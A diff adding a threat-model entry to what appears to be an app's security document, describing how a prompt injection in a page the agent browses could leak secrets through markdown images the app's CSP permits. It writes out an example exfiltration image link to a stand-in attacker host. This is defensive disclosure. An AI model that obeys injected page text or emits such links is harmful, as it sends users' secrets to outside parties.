@@ -58,6 +58,13 @@ session store.
   app will execute. They are only written through an explicit confirmation
   flow (`allowExecutableConfigs`) — treat any file claiming to be a Nocturn
   config as untrusted input.
+- **Remote images in model output.** The CSP allows `img-src https:` so
+  markdown images returned by providers render inline. A prompt injection
+  (e.g. in a page the agent reads via Browser Use) could abuse this as a
+  passive exfiltration channel: `![](https://attacker/?d=<secret>)` sends one
+  GET outside the `connect-src` fence. This is an accepted trade-off —
+  rendering provider images is a deliberate feature; if you do not need
+  remote images, remove `https:` from `img-src` in `src-tauri/tauri.conf.json`.
 
 ## Reporting
 
